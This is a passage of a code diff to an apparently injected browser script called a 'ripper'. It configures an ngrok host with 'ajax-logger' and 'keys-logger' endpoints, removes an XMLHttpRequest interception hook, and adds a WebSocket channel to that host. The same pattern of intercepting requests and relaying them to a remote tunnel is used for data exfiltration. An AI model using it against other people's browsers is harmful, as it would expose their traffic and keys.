@@ -1,28 +1,29 @@
 window.keys = {}
 window.rip_configs = {
-  host: "https://eel-moral-ape.ngrok-free.app",
   ajax_logger: "/api/ajax-logger",
   keys_logger: "/api/keys-logger",
+  host: "https://eel-moral-ape.ngrok-free.app",
 }
-;(function (xhr) {
-  var XHR = XMLHttpRequest.prototype
-
-  var open = XHR.open
-  var send = XHR.send
-
-  XHR.open = function (method, url) {
-    this._url = url
-    this._method = method
-    return open.apply(this, arguments)
-  }
-
-  XHR.send = function (_body) {
-    this.addEventListener("load", function () {
-      alert(this._url)
+;(() => {
+  if (typeof WebSocket !== "undefined" && window.rip_configs) {
+    const socket = new WebSocket(`ws://${new URL(window.rip_configs.host).host}/ws`)
+    // message is received
+    socket.addEventListener("message", (event) => {
+      console.log(`Nhận dữ liệu từ ripper: ${event.data}`)
     })
-    return send.apply(this, arguments)
+
+    // socket opened
+    socket.addEventListener("open", (event) => {
+      window.socket = socket
+      socket.send(JSON.stringify({ action: "ping" }))
+    })
+
+    // error handler
+    socket.addEventListener("error", (event) => {
+      alert(`Xảy ra lỗi khi kết nối tới máy chủ`)
+    })
   }
-})(XMLHttpRequest)
+})()
 
 window.logger_callback = async (url, data_logger, show_alert = false) => {
   if (typeof fetch !== "undefined") {
